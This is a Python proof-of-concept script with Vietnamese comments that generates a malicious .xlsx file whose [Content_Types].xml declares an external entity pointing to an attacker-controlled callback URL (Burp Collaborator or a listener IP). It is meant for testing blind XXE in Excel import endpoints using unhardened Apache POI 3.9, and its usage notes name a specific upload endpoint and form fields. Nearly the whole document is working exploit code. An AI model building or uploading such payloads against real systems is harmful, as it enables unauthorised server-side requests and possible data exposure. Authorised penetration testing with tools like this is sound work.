#!/usr/bin/env python3
"""
Tao file .xlsx (OOXML) chua payload XXE trong [Content_Types].xml, dung de PoC
lo hong XXE qua cac endpoint import Excel (POI 3.9, khong harden XML parser).

Usage:
    # Dung Burp Collaborator (dan URL Burp da generate qua Burp > Collaborator client > Copy to clipboard):
    python poc_xxe_builder.py --url "http://abcdefgh12345.oastify.com" [--output poc.xlsx]

    # Hoac dung listener tu dung (python -m http.server):
    python poc_xxe_builder.py --host 192.168.x.x --port 8000 [--callback-path xxe-hit] [--output poc.xlsx]

Sau khi tao xong:
    1a. Neu dung Burp: mo Burp > Collaborator client > Poll now sau khi upload de xem callback.
    1b. Neu dung listener tu dung (cung LAN voi target): python -m http.server 8000
    2. Upload file output len endpoint import (vi du POST /api/v2/document-library/import,
       field "file", kem field "groupingProcessRegular"=1).
    3. Neu XXE thuc thi, Burp/listener se nhan duoc 1 request tu IP server target.
"""

import argparse
import zipfile
import io

CONTENT_TYPES_TEMPLATE = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Types [<!ENTITY xxe SYSTEM "{callback_url}">]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="&xxe;"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>"""

ROOT_RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>"""

WORKBOOK_XML = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets>
<sheet name="Sheet1" sheetId="1" r:id="rId1"/>
</sheets>
</workbook>"""

WORKBOOK_RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>"""

SHEET1_XML = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData/>
</worksheet>"""


def build_xlsx(callback_url: str) -> bytes:
    content_types = CONTENT_TYPES_TEMPLATE.format(callback_url=callback_url)

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", content_types)
        zf.writestr("_rels/.rels", ROOT_RELS)
        zf.writestr("xl/workbook.xml", WORKBOOK_XML)
        zf.writestr("xl/_rels/workbook.xml.rels", WORKBOOK_RELS)
        zf.writestr("xl/worksheets/sheet1.xml", SHEET1_XML)
    return buf.getvalue()


def main():
    parser = argparse.ArgumentParser(description="Build XXE PoC .xlsx (OOXML) payload")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--url", help="Dan thang URL Burp Collaborator (vi du: http://abcdefgh12345.oastify.com)")
    group.add_argument("--host", help="IP/host may attacker de tu chay listener (vi du: 192.168.70.50)")
    parser.add_argument("--port", type=int, default=8000, help="Port listener khi dung --host (default: 8000)")
    parser.add_argument("--callback-path", default="xxe-hit", help="Path callback khi dung --host")
    parser.add_argument("--output", default="poc.xlsx", help="Ten file output (default: poc.xlsx)")
    args = parser.parse_args()

    if args.url:
        callback_url = args.url.rstrip("/")
    else:
        callback_url = f"http://{args.host}:{args.port}/{args.callback_path}"

    data = build_xlsx(callback_url)
    with open(args.output, "wb") as f:
        f.write(data)

    print(f"[+] Da tao {args.output} ({len(data)} bytes)")
    print(f"[+] Callback URL: {callback_url}")
    if args.host:
        print(f"[+] Nho chay listener truoc khi upload: python -m http.server {args.port}")
    else:
        print("[+] Nho mo Burp Collaborator client va bam 'Poll now' sau khi upload de xem callback")


if __name__ == "__main__":
    main()
